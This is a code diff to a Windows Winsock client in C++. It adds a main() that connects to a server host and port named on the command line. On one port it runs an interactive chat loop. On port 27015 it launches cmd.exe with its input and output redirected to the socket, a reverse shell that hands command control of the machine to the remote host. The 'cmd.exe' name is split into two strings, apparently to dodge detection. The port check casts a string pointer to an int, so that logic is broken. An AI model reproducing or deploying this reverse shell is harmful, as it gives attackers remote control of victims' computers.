@@ -1,9 +1,5 @@
 #include "client.h"
-
-void ServerConnection::parse() {
-    
-}
-
+#if 0
 bool Client::connected = false;
 
 Client::Client(std::string ip, int port) {
@@ -22,6 +18,8 @@ Client::Client(std::string ip, int port) {
 
 bool Client::connectToServer() {
     connection = socket(address.sin_family, SOCK_STREAM, IPPROTO_TCP); //Set Connection socket
+    u_long mode = 1;
+    ioctlsocket(connection, FIONBIO, &mode);
     if (connect(connection, (SOCKADDR*)&address, sizeof(address)) != 0) {
         std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
         return false;
@@ -63,7 +61,146 @@ std::string Client::recvString() {
     recvbuf.resize(len);
     return recvbuf;
 }
+#endif
+const std::string& ServerConnection::recvMessage() {
+    this->recv();
+    return message();
+}
 
+bool ServerConnection::sendMessage(const std::string& buf) {
+    if (!buf.empty()) {
+        std::string msgLen;
+        msgLen.resize(sizeof(messageLen));
+        *(uint32_t*)&msgLen[0] = htonl(buf.size());
+        out += msgLen + buf;
+    }
+    return this->send();
+}
+
+ServerConnection::~ServerConnection() {
+    closesocket(socket);
+}
+
+int main(int argc, char** argv) {
+
+    WSADATA wsaData;
+    SOCKET connected = INVALID_SOCKET;
+    struct addrinfo* result = NULL, * ptr = NULL, hints;
+    int iResult;
+    int recvbuflen = DEFAULT_BUFLEN;
+
+    // Validate the parameters
+    if (argc != 3) {
+        std::cout << "usage: " << argv[0] << " server - name, port number" << std::endl;
+        return 1;
+    }
+
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        std::cout << "WSAStartup failed with error: " << iResult << std::endl;
+        return 1;
+    }
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Resolve the server address and port
+    iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
+    if (iResult != 0) {
+        std::cout << "getaddrinfo failed with error: " << iResult << std::endl;
+        WSACleanup();
+        return 1;
+    }
+ 
+    connected = socket(result->ai_family, SOCK_STREAM, IPPROTO_TCP); //Set Connection socket
+    if (connected == INVALID_SOCKET) {
+        std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
+    iResult = connect(connected, result->ai_addr, result->ai_addrlen);
+    if (iResult == SOCKET_ERROR) {
+        closesocket(connected);
+        connected = INVALID_SOCKET;
+    }
+    //u_long mode = 1;
+    //ioctlsocket(connected, FIONBIO, &mode);
+
+    ServerConnection server(connected);
+    //server.sendMessage("hello");
+    //std::cout << server.recvMessage();
+
+    if ((int)argv[2] == 27016) {
+        fd_set readfds;
+        std::string message = "";
+        std::string response = "";
+
+        FD_ZERO(&readfds);
+        FD_SET(_fileno(stdin), &readfds);
+        FD_SET(connected, &readfds);
+
+        //COULDN'T GET THE ASYNC SOCKET AND STD::CIN TO WORK PROPERLY
+
+        while (true) {
+            //we want to receive data from stdin so add these file
+            //descriptors to the file descriptor set. These also have to be reset
+            //within the loop since select modifies the sets.
+            fd_set recvfds = readfds;
+
+            iResult = select(2, &recvfds, NULL, NULL, NULL);
+            if (iResult == -1 && errno != EINTR)
+            {
+                std::cout << "Error in select: " << errno << std::endl;
+                break;
+            }
+            else if (iResult == -1 && errno == EINTR)
+            {
+                std::cout << "Interrupted" << std::endl;
+                break;
+            }
+            if (FD_ISSET(_fileno(stdin), &recvfds))
+            {
+                std::cin >> message;
+                server.sendMessage(message);
+            }
+            if (FD_ISSET(connected, &recvfds))
+            {
+                response = server.recvMessage();
+                if (!response.empty()) {
+                    std::cout << response << std::endl;
+                }
+            }
+        }
+    }
+    else if ((int)argv[2] == 27015) {
+        STARTUPINFOA startup;
+        PROCESS_INFORMATION process;
+
+        TCHAR username[257];
+        DWORD size = 257;
+        GetUserName((TCHAR*)username, &size);
+
+        std::string strtmp(&username[0], &username[(int)size - 1]);
+
+        std::string path = "C:\\Users\\" + strtmp + "\\Downloads\\";
+
+        memset(&startup, 0, sizeof(startup));
+        startup.cb = sizeof(startup);
+        startup.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        startup.hStdInput = startup.hStdOutput = startup.hStdError = (HANDLE)connected;
+        WCHAR cm[256] = L"cm";
+        WCHAR d[256] = L"d.exe";
+        CreateProcessA(NULL, strcat((char*)cm, (char*)d), 0, 0, 1, 0, 0, 0, &startup, &process);
+        WaitForSingleObject(process.hProcess, INFINITE);
+        CloseHandle(process.hProcess);
+        CloseHandle(process.hThread);
+    }
+}
+/*
 int main(int argc, char** argv) {
 
     // Validate the parameters
@@ -90,6 +227,7 @@ int main(int argc, char** argv) {
     }
     client.closeConnection();
 }
+*/
 /*
 int main2(int argc, char** argv) {
     WSADATA wsaData;
